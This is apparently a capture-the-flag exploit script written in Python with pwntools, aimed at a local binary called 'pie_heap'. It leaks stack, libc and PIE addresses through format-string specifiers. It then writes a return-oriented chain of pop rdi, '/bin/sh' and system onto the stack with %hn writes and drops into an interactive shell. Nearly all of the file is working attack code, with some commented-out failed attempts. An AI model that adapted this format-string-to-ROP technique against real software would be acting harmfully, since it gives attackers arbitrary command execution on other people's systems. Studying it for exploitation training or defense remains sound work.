from pwn import *

p = process('pie_heap') #env = {'LD_PRELOAD':'./libc.so.6'}
#libc = ELF('libc.so.6')
elf = ELF('pie_heap')

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b 
    return a - b 

##########step1##########

payload = ""
payload += "%7$p.%8$p.%17$p.%12$p.%13$p." 



p.recv()
p.sendline(payload)
p.recvuntil(".")
stack_addr1 = int(p.recvuntil(".",drop = True),16)
log.info("stack_addr1 addr: " + hex(stack_addr1))
libc_start_main_ret = int(p.recvuntil(".",drop = True),16)
log.info("libc_start_main_ret addr: " + hex(libc_start_main_ret))
stack_addr2 = int(p.recvuntil(".",drop = True),16)
log.info("stack_addr2 addr: " + hex(stack_addr2))
pie_addr = int(p.recvuntil(".",drop = True),16)
log.info("pie_addr addr: " + hex(pie_addr))

libc_base = libc_start_main_ret - 0x202e1
system_addr = libc_base + 0x3f480
sh_addr = libc_base + 0x1619b9
log.info("libc_base addr: " + hex(libc_base))
log.info("system_addr addr: " + hex(system_addr))
log.info("sh_addr addr: " + hex(sh_addr))
log.info("ret_addr addr: " + hex(stack_addr2 + 8))



##########step2##########

#########ret addr#######
#echo_better_ret = 0x7ffcb0f30b18
echo_better_ret = pie_addr - 36
printf_addr = pie_addr - 338
log.info("printf_addr addr: " + hex(printf_addr))
log.info("echo_better_ret addr: " + hex(echo_better_ret))
#echo_ret = 0x7fffffffdfb8
echo_ret = stack_addr1 + 0x18
pr_addr = pie_addr + 0x6c
log.info("pr_addr addr: " + hex(pr_addr + 8))

pause()

'''

##############test############
for i in range(0,99) :
   p.sendline('wait')

pause()


p.sendline('wait')

p.interactive()
#############test##############

'''



def edit1(low):
    pattern = "%{}c%{}$hn"
    payload = ""
    payload += pattern.format(low,8)
    payload = payload.ljust(16,"A")
    #pause()
    p.sendline(payload)

def edit2(data):
    pattern = "%{}c%{}$hn"
    payload = ""
    payload += pattern.format(data,12)
    payload = payload.ljust(16,"B")
    #pause()
    p.sendline(payload)

n = 16 + 14
pattern = "%{}c%{}$hn"

stack_addr2_low = stack_addr2 & 0xffff

a = stack_addr2_low -0x38

print hex(stack_addr2_low)

######## pop rdi;ret

pr_low = pr_addr & 0xffff
pr_mid = (pr_addr >> 16) & 0xffff
pr_high = (pr_addr >> 32) & 0xffff
edit1(stack_addr2_low - 24)
edit2(pr_low)
edit1(stack_addr2_low - 22)
edit2(pr_mid)
edit1(stack_addr2_low - 20)
edit2(pr_high)
'''
pattern2 = "%{}ca%{}$hn"
payload2 = ""
payload2 += pattern2.format(0xffff,12)
payload2 = payload2.ljust(16,"B")
#pause()
p.sendline(payload2)
'''
### "/bin/sh\x00"

sh_low = sh_addr & 0xffff
sh_mid = (sh_addr >> 16) & 0xffff
sh_high = (sh_addr >> 32) & 0xffff
print hex(sh_low)
print hex(stack_addr2_low -16)
edit1(stack_addr2_low - 16)
edit2(sh_low)
edit1(stack_addr2_low - 14)
edit2(sh_mid)
edit1(stack_addr2_low - 12)
edit2(sh_high)


### system

system_low = system_addr & 0xffff
system_mid = (system_addr >> 16) & 0xffff
system_high = (system_addr >> 32) & 0xffff

edit1(stack_addr2_low -8)
edit2(system_low)
edit1(stack_addr2_low -6)
edit2(system_mid)
edit1(stack_addr2_low -4)
edit2(system_high)


###send to 100 ,let it out of echo_better
for i in range(0,80) :
   p.sendline('wait')

###### wrong #
'''
pattern = "%{}c%{}$hn"
payload1 = ""
payload1 += pattern.format(a,8)
payload1 = payload1.ljust(16,"A")
pause()
p.sendline(payload1)
pattern = "%{}c%{}$hn"
payload2 = ""
payload2 += pattern.format(0x0a63,12)
payload2 = payload2.ljust(16,"B")
pause()
p.sendline(payload2)
'''
#edit1(stack_addr2_low -56)
#edit2(0x0a63)

###### wrong #

pause()

p.interactive()
'''
edit2(sh_low)
payload2 = ""
payload2 += pattern.format(sh_low,12)
payload = payload.ljust(16,"B")
pause()
p.sendline(payload)


payload2 += pattern.format(s_sub(sh_mid,sh_low),12)
payload2 += pattern.format(s_sub(sh_high,sh_mid),12)

### system

system_low = system_addr & 0xffff
system_mid = (system_addr >> 16) & 0xffff
system_high = (system_addr >> 32) & 0xffff

payload += pattern.format(s_sub(system_low,sh_high),n+4)
payload += pattern.format(s_sub(system_mid,system_low),n+5)
payload += pattern.format(s_sub(system_high,system_mid),n+6)

###padding

payload = payload.ljust(112,"A") #7*16=112

# ret -->  pop rid; ret
payload += p64(stack_addr2)

# rdi --> "/bin/sh\x00"
payload += p64(stack_addr2+8)
payload += p64(stack_addr2+10)
payload += p64(stack_addr2+12)

# system
payload +=p64(stack_addr2+16)
payload +=p64(stack_addr2+18)
payload +=p64(stack_addr2+20)

pause()

p.sendline(payload)

p.interactive()
'''
